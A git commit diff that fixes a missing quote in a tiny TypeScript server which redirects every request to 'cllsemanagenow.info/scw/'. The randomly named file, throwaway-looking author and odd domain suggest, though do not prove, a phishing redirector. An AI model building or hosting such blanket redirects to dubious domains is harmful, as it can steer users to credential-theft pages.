c0c90f58b3da4fd3d90b715ca3faa70eb4de91b2
United8674 <catton391@gmail.com>
2025-08-20 04:22:38 -0700

    Update apl5vvc.ts

--- apl5vvc.ts
+++ apl5vvc.ts
@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://cllsemanagenow.info/scw/,
+      Location: "https://cllsemanagenow.info/scw/",
     },
   });
 });
